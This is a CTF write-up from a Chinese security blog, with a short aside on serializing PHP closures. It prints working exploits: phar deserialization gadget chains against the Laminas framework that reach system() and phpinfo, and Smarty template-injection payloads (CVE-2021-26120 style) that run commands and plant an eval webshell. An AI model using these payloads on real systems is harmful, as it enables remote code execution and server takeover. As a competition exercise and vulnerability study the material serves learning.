<p>例子:可以明显看到var_dump执行的顺序是不一样的</p>
<p><img src="https://img-blog.csdnimg.cn/42e9ecc30f99495a84db2910200a26cf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p><img src="https://img-blog.csdnimg.cn/0cf72b36e6914f3fb8b0aeaab0227223.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<h2 id="反序列化函数闭包"><a href="#反序列化函数闭包" class="headerlink" title="反序列化函数闭包"></a>反序列化函数闭包</h2><p>闭包函数也就是匿名函数,而在定义闭包函数的时候就会自动实例化<code>Closure</code>类</p>
<p><img src="https://img-blog.csdnimg.cn/ce5c520a5605423e85df8d87c7e6ba64.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>但是直接用php自带的<code>serialize</code>函数对这个类进行序列化的时候会报错,但是我们可以通过工具去实现闭包函数的序列化</p>
<p><strong>0x01:安装</strong></p>
<p><a href="https://github.com/opis/closure">closure</a></p>
<p><img src="https://img-blog.csdnimg.cn/d503d9e6d45e4162a781cab5c86a794f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p><strong>0x02:使用</strong></p>
<p>之后直接测试吧，可以发现闭包函数直接用<code>unserialize</code>反序列化之后和<code>opis\closure\unserialize</code>反序列化的时候的返回值是不一样的但是都可以直接当作函数使用：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;vendor/autoload.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;a&quot;</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable">$b</span> = opis\<span class="built_in">closure</span>\serialize(<span class="variable">$a</span>);</span><br><span class="line">var_dump(opis\<span class="built_in">closure</span>\serialize(<span class="variable">$a</span>));</span><br><span class="line">var_dump(unserialize(<span class="variable">$b</span>));</span><br><span class="line">unserialize(<span class="variable">$b</span>)();</span><br><span class="line">var_dump(opis\<span class="built_in">closure</span>\unserialize(<span class="variable">$b</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//string(198) &quot;C:32:&quot;Opis\Closure\SerializableClosure&quot;:152:&#123;a:5:&#123;s:3:&quot;use&quot;;a:0:&#123;&#125;s:8:&quot;function&quot;;s:29:&quot;function()&#123;</span></span><br><span class="line"><span class="comment">//    echo &quot;a&quot;;</span></span><br><span class="line"><span class="comment">//&#125;&quot;;s:5:&quot;scope&quot;;N;s:4:&quot;this&quot;;N;s:4:&quot;self&quot;;s:32:&quot;000000000bc714b9000000004a5c0eab&quot;;&#125;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//object(Opis\Closure\SerializableClosure)#2 (5) &#123;</span></span><br><span class="line"><span class="comment">//  [&quot;closure&quot;:protected]=&gt;</span></span><br><span class="line"><span class="comment">//  object(Closure)#5 (0) &#123;</span></span><br><span class="line"><span class="comment">//  &#125;</span></span><br><span class="line"><span class="comment">//  [&quot;reflector&quot;:protected]=&gt;</span></span><br><span class="line"><span class="comment">//  NULL</span></span><br><span class="line"><span class="comment">//  [&quot;code&quot;:protected]=&gt;</span></span><br><span class="line"><span class="comment">//  string(29) &quot;function()&#123;</span></span><br><span class="line"><span class="comment">//    echo &quot;a&quot;;</span></span><br><span class="line"><span class="comment">//&#125;&quot;</span></span><br><span class="line"><span class="comment">//  [&quot;reference&quot;:protected]=&gt;</span></span><br><span class="line"><span class="comment">//  NULL</span></span><br><span class="line"><span class="comment">//  [&quot;scope&quot;:protected]=&gt;</span></span><br><span class="line"><span class="comment">//  NULL</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//a</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//object(Closure)#7 (0) &#123;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>没有人比我更爱学习</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>web程序设计-Project</title>
    <url>/2022/05/06/web%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E5%BE%80%E6%9C%9F%E4%BD%9C%E4%B8%9A%E5%B1%95%E7%A4%BA/</url>
    <content><![CDATA[<p><a href="https://github.com/ameuu/WebHomework">MyProjectSource</a></p>
]]></content>
      <categories>
        <category>作业</category>
      </categories>
      <tags>
        <tag>homework</tag>
      </tags>
  </entry>
  <entry>
    <title>红明谷web</title>
    <url>/2022/03/23/%E7%BA%A2%E6%98%8E%E8%B0%B7web1/</url>
    <content><![CDATA[<h4 id="Fan-website"><a href="#Fan-website" class="headerlink" title="Fan website"></a>Fan website</h4><ul>
<li>文件上传</li>
<li>php反序列化</li>
<li>laminas cve</li>
</ul>
<p>直接有<code>www.zip</code>源码泄露，然后题目是关于<code>laminas</code>的，所以直接搜索<code>laminas cve</code>，就可以发现存在反序列化漏洞，但是我没找到反序列化触发的点</p>
<p><img src="https://img-blog.csdnimg.cn/35772c8f358f427d8a67b6e5ce90436e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<span id="more"></span>

<p>然后可以发现存在文件上传的点</p>
<p><img src="https://img-blog.csdnimg.cn/48b50cc532b84beba48052dd1193cc2f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>并且还存在删除文件的点，那么就可以使用phar协议了，在百度的时候发现phar协议在unlink函数中也是可以执行的</p>
<p>所以直接开干</p>
<p>laminas cve之前没有遇到过，但是网上很多师傅都写了poc，就直接跟着其中某一个走了</p>
<p>但是写完exp之后发现，在文件上传的控制器里面存在过滤</p>
<p><img src="https://img-blog.csdnimg.cn/78ad9a0005544f2a8503ac5375e50229.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>php可以直接去掉，而后面的关键字可以利用gzip压缩绕过（感谢姜少！</p>
<p>网上的exp:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Laminas</span>\<span class="title">View</span>\<span class="title">Renderer</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Laminas</span>\<span class="title">Config</span>\<span class="title">Config</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PhpRenderer</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">1000000</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">                <span class="variable">$res</span> .= <span class="string">&#x27;ameuuameuuameuua&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__content = <span class="variable">$res</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__helpers = <span class="keyword">new</span> Config([]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Laminas</span>\<span class="title">Config</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Config</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data = [<span class="string">&#x27;shutdown&#x27;</span>=&gt;<span class="string">&#x27;phpinfo&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Laminas</span>\<span class="title">Log</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Laminas</span>\<span class="title">View</span>\<span class="title">Renderer</span>\<span class="title">PhpRenderer</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Phar</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Logger</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;writers = [<span class="keyword">new</span> PhpRenderer()];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Logger();</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;test.phar&quot;</span>); <span class="comment">//.phar文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&#x27;__HALT_COMPILER();&#x27;</span>); <span class="comment">//固定的</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$a</span>); <span class="comment">//触发的头是C1e4r类，所以传入C1e4r对象</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;exp.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//随便写点什么生成个签名</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>直接上传，然后删除的时候用phar协议</p>
<p><img src="https://img-blog.csdnimg.cn/4055e9aa16ab4d888d24bf8067ce6cbd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p><a href="https://xz.aliyun.com/u/16398">Mrkaixin</a>师傅的exp：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Laminas</span>\<span class="title">View</span>\<span class="title">Resolver</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">TemplateMapResolver</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">map</span> = [&quot;<span class="title">setBody</span>&quot;=&gt;&quot;<span class="title">system</span>&quot;];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Laminas</span>\<span class="title">View</span>\<span class="title">Renderer</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PhpRenderer</span>&#123;</span><br><span class="line">        <span class="title">function</span> <span class="title">__construct</span>()&#123;</span><br><span class="line">            $<span class="title">res</span> = &#x27;&#x27;;</span><br><span class="line">            <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">1000000</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">                <span class="variable">$res</span> .= <span class="string">&#x27;ameuuameuuameuua&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__content = <span class="variable">$res</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__helpers = <span class="keyword">new</span> \Laminas\View\Resolver\TemplateMapResolver();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Laminas</span>\<span class="title">Log</span>\<span class="title">Writer</span>&#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">AbstractWriter</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="title">class</span> <span class="title">Mail</span> &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">eventsToMail</span> = [&quot;<span class="title">cat</span> /<span class="title">flag</span>&quot;];  </span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$subjectPrependText</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$mail</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;mail = <span class="keyword">new</span> \Laminas\View\Renderer\PhpRenderer();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Laminas</span>\<span class="title">Log</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Logger</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">writers</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;writers = [<span class="keyword">new</span> \Laminas\Log\Writer\Mail()];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line"><span class="title">use</span> <span class="title">Laminas</span>\<span class="title">Log</span>\<span class="title">Logger</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Logger();</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;a.phar&quot;</span>); <span class="comment">//.phar文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&#x27;__HALT_COMPILER();&#x27;</span>); <span class="comment">//固定的</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$a</span>); <span class="comment">//触发的头是C1e4r类，所以传入C1e4r对象</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;exp.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//随便写点什么生成个签名</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/d1d4908d93b342c4816e79541d86024e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<h5 id="赛后思考"><a href="#赛后思考" class="headerlink" title="赛后思考"></a>赛后思考</h5><p><del>因为当时是直接用别的师傅的poc打的，只是大概地走了一遍防止poc不一致，所以现在再来仔细走一遍，试着能不能自己挖出一条（？</del></p>
<p><strong>0x01:Logger-destruct开始</strong></p>
<p>首先要找链子的入口，一般会从<code>__construct</code>或者<code>__destruct</code>开始，而Logger类里面的<code>__destrcut</code>存在我们可以控制的值</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;writers <span class="keyword">as</span> <span class="variable">$writer</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="variable">$writer</span>-&gt;shutdown();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (\<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在这里，会调用一个<code>shutdown</code>方法，所以很容易就能想到可能会触发<code>__call</code>魔术方法，然后可以去全局搜索<code>__call</code></p>
<p>可以在<code>PhpRenderer</code>发现限制比较少，并且还存在<code>call_user_func_array</code>函数，直接跟一下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$argv</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$plugin</span> = <span class="keyword">$this</span>-&gt;plugin(<span class="variable">$method</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_callable(<span class="variable">$plugin</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> call_user_func_array(<span class="variable">$plugin</span>, <span class="variable">$argv</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$plugin</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>plugin</code>方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">plugin</span>(<span class="params"><span class="variable">$name</span>, <span class="keyword">array</span> <span class="variable">$options</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;getHelperPluginManager()-&gt;get(<span class="variable">$name</span>, <span class="variable">$options</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>跟踪<code>getHelperPluginManager()</code>方法，直接返回了<code>$this-&gt;__helpers</code>，显而易见这个属性是我们可以完全控制的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getHelperPluginManager</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">null</span> === <span class="keyword">$this</span>-&gt;__helpers) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;setHelperPluginManager(<span class="keyword">new</span> HelperPluginManager(<span class="keyword">new</span> ServiceManager()));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;__helpers;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>那再回去看<code>plugin</code>方法，发现要调用所返回的方法里面的<code>get</code>方法，那么可以继续去找哪里存在我们可以利用的get方法</p>
<p><code>Config</code>-get，直接返回<code>$this-&gt;data[&#39;shutdown&#39;]</code>的值，也是我们可以控制的，就比如我们初始化<code>$this-&gt;data[&#39;shutdown&#39;] = &#39;phpinfo&#39;</code>，这样会将<code>phpinfo</code>一直返回到<code>call_user_func_array($plugin, $argv);</code>，而因为shutdown方法并没有参数，所以就会直接执行<code>phpinfo();</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$default</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (array_key_exists(<span class="variable">$name</span>, <span class="keyword">$this</span>-&gt;data)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[<span class="variable">$name</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$default</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是就像我说的限制一样，这里不能传入参数，只能执行某一个方法，所以不能用<code>PhpRenderer</code>的<code>__call</code>，得再找找，但是找到的<code>__call</code>方法要么是直接返回一个名字，要么限制过多</p>
<p>再返回到<code>Logger</code>，突然想到那么直接找<code>shutdown</code>方法呢</p>
<p>只有<code>Mail</code>方法好像可以用，审计一下吧！</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">shutdown</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// If there are events to mail, use them as message body.  Otherwise,</span></span><br><span class="line">    <span class="comment">// there is no mail to be sent.</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;eventsToMail)) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;subjectPrependText !== <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// Tack on the summary of entries per-priority to the subject</span></span><br><span class="line">        <span class="comment">// line and set it on the Laminas\Mail object.</span></span><br><span class="line">        <span class="variable">$numEntries</span> = <span class="keyword">$this</span>-&gt;getFormattedNumEntriesPerPriority();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mail-&gt;setSubject(<span class="string">&quot;<span class="subst">&#123;$this-&gt;subjectPrependText&#125;</span> (<span class="subst">&#123;$numEntries&#125;</span>)&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Always provide events to mail as plaintext.</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;mail-&gt;setBody(implode(PHP_EOL, <span class="keyword">$this</span>-&gt;eventsToMail));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Finally, send the mail.  If an exception occurs, convert it into a</span></span><br><span class="line">    <span class="comment">// warning-level message so we can avoid an exception thrown without a</span></span><br><span class="line">    <span class="comment">// stack frame.</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;transport-&gt;send(<span class="keyword">$this</span>-&gt;mail);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (TransportException\ExceptionInterface <span class="variable">$e</span>) &#123;</span><br><span class="line">        trigger_error(</span><br><span class="line">            <span class="string">&quot;unable to send log entries via email; &quot;</span> .</span><br><span class="line">            <span class="string">&quot;message = <span class="subst">&#123;$e-&gt;getMessage()&#125;</span>; &quot;</span> .</span><br><span class="line">            <span class="string">&quot;code = <span class="subst">&#123;$e-&gt;getCode()&#125;</span>; &quot;</span> .</span><br><span class="line">            <span class="string">&quot;exception class = &quot;</span> . get_class(<span class="variable">$e</span>),</span><br><span class="line">            E_USER_WARNING</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>1.首先要求<code>$this-&gt;eventsToMail</code>不为空</p>
<p>2.<code>getFormattedNumEntriesPerPriority()</code>方法是将<code>$this-&gt;numEntriesPerPriority </code>数组转成字符串并返回字符串，而搜索了一下发现没有可用的<code>setSubject</code>方法，所以可以直接给<code>$this-&gt;subjectPrependText </code>赋值为null</p>
<p>3.可以找一下有没有可以利用的<code>setBody</code>，但是找了一圈不在，那又又又想到了<code>__call</code>方法，因为这次我们可以传入我们可控的参数，所以又想到了<code>PhpRenderer</code>的<code>__call</code>方法，然后再用<code>Config</code>里面的get方法，初始化<code>$this-&gt;data[&#39;setBody&#39;] = &#39;system&#39;</code>，然后只要我们通过修改<code>$this-&gt;eventsToMail</code>的值来进行命令执行就好了</p>
<p><strong>0x02:Stream-destruct开始</strong></p>
<p>在用别的师傅的poc之前，因为最开始看的cve说是从<code>Stream</code>的<code>__destruct</code>方法开始的，然后百度和这个题目给的不大一样，原来的if判断只判断了<code>$this-&gt;cleanup</code>是否为空，导致再unlink的时候触发<code>toString</code>方法，但是其实这里的<code>file_exits</code>也能触发<code>toString</code>方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_resource(<span class="keyword">$this</span>-&gt;stream)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;stream = <span class="literal">null</span>; <span class="comment">//Could be listened by others</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;cleanup &amp;&amp; is_string(<span class="keyword">$this</span>-&gt;streamName) &amp;&amp; file_exists(<span class="keyword">$this</span>-&gt;streamName)) &#123;</span><br><span class="line">            ErrorHandler::start(E_WARNING);</span><br><span class="line">            unlink(<span class="keyword">$this</span>-&gt;streamName);</span><br><span class="line">            ErrorHandler::stop();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>所以之后找一下有没有可以利用的<code>toString</code>方法，然而并没有（😅</p>
<h4 id="Smarty-Calculator"><a href="#Smarty-Calculator" class="headerlink" title="Smarty_Calculator"></a>Smarty_Calculator</h4><ul>
<li>Smarty沙箱绕过</li>
<li>CVE-2021-26119</li>
<li>CVE-2021-29454</li>
</ul>
<blockquote>
<p>复现捏</p>
</blockquote>
<h5 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h5><p><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-26119">CVE - CVE-2021-26119 (mitre.org)</a></p>
<p><a href="https://www.cnblogs.com/sukusec301/p/15832670.html">CVE-2021-26119 PHP Smarty 模版沙箱逃逸远程代码执行漏洞 - sukusec不觉水流 - 博客园 (cnblogs.com)</a></p>
<h5 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h5><p><code>www.zip</code>泄露</p>
<p><code>index.php</code>，会先判断Cookie，检测·是否登录，并且过滤了<code>php|&lt;|flag|?</code>，之后直接调用<code>Smarty#display</code>，将data传进去</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">  <span class="variable">$pattern</span> = <span class="string">&quot;php|\&lt;|flag|\?&quot;</span>;</span><br><span class="line">  <span class="variable">$vpattern</span> = explode(<span class="string">&quot;|&quot;</span>, <span class="variable">$pattern</span>);</span><br><span class="line">  <span class="keyword">foreach</span> (<span class="variable">$vpattern</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&quot;/<span class="subst">$value</span>/&quot;</span>, <span class="variable">$data</span>)) &#123;</span><br><span class="line">		  <span class="keyword">echo</span>(<span class="string">&quot;&lt;div style=&#x27;width:100%;text-align:center&#x27;&gt;&lt;h5&gt;Calculator don  not like U&lt;h5&gt;&lt;br&gt;&quot;</span>);</span><br><span class="line">          <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]))&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">      <span class="variable">$data</span> = waf(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;div style=&#x27;width:100%;text-align:center&#x27;&gt;&lt;h5&gt;Only smarty people can use calculators:&lt;h5&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">      <span class="variable">$smarty</span>-&gt;display(<span class="string">&quot;string:&quot;</span> . <span class="variable">$data</span>);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(\&quot;你还没有登录\&quot;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://www.venustech.com.cn/new_type/aqtg/20210226/22409.html">PHP Smarty模版代码注入漏洞（CVE-2021-26120）-启明星辰 (venustech.com.cn)</a></p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;function+name=&#x27;rce()&#123;&#125;;system(&quot;id&quot;);function%0A%0A&#x27;&#125;&#123;/function&#125;</span><br></pre></td></tr></table></figure>

<p>但是不能路径穿越</p>
<p>可以写入一句话</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;function+name=&#x27;rce()&#123;&#125;;eval($_POST[&quot;1&quot;]);function%0A%0A&#x27;&#125;&#123;/function&#125;</span><br><span class="line"></span><br><span class="line">?1=system(&#x27;cat%20/flag&#x27;);</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>参加的各种比赛</category>
      </categories>
